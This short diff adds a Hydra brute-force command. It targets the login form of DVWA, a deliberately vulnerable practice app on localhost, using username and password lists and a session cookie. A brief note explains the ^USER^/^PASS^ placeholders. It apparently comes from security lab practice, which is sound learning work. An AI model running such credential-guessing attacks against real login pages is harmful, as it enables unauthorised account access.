@@ -1,0 +1,2 @@
+hydra 127.0.0.1 -V -L /home/beheerder/brute_force/email_list.txt -P /home/beheerder/brute_force/password_list.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=0gluu9rs9fmmbbhu9gh50llph3; security=low"
+ ^USER^ & ^PASS^ reffer to my list of usenames and passwords respectiviely.
